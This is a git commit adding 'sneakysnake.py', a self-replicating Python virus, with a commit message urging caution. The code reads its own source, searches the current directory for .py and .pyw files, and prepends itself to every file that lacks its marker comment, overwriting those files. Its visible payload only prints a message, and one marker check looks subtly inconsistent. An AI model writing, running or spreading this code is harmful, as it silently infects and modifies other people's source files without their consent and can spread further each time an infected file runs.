c183c379efa51317f34e30ef9df63376483cb2b5
ExeLxrd <tech.mccune@gmail.com>
2021-09-18 17:50:19 -0500

    pleasssssse run with caution

---
+++ sneakysnake.py
@@ -0,0 +1,47 @@
+# SNEAKY SNAKE
+
+import sys
+import glob
+
+virus_code = []
+
+with open(sys.argv[0], 'r') as f:
+    lines = f.readlines()
+
+self_replicating_part = False
+for line in lines:
+    if line == "# SNEAKY SNAKE":
+        self_replicating_part = True
+    if not self_replicating_part:
+        virus_code.append(line)
+    if line == "# SLITHERED AWAY\n":
+        break
+
+python_files = glob.glob('*.py') + glob.glob('*.pyw')
+
+for file in python_files:
+    with open(file, 'r') as f:
+        file_code = f.readlines()
+
+    infected = False
+
+    for line in file_code:
+        if line == "# SNEAKY SNAKE\n":
+            infected = True
+            break
+
+    if not infected:
+        final_code = []
+        final_code.extend(virus_code)
+        final_code.extend('\n')
+        final_code.extend(file_code)
+
+        with open(file, 'w') as f:
+            f.writelines(final_code)
+
+def sneakysnake():
+    print("Ssssssssneaky Ssssssnake")
+
+sneakysnake()
+
+# SLITHERED AWAY
